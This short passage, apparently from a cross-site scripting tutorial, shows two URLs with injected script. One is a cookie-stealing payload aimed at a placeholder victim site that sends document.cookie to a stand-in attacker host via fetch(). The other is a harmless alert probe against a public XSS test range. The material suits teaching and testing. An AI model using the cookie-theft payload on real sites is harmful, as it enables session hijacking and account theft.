...
https://victim.com/site?vuln_param=X<script>fetch('https://stealer.com/grab?c='+encodeURIComponent(document.cookie))</script>

Try this example to test a parameter in the body-part of a site:
https://public-firing-range.appspot.com/reflected/parameter/body/400?q=b<h1>HALLO</h1><script>alert("VULNERABLE");</script>
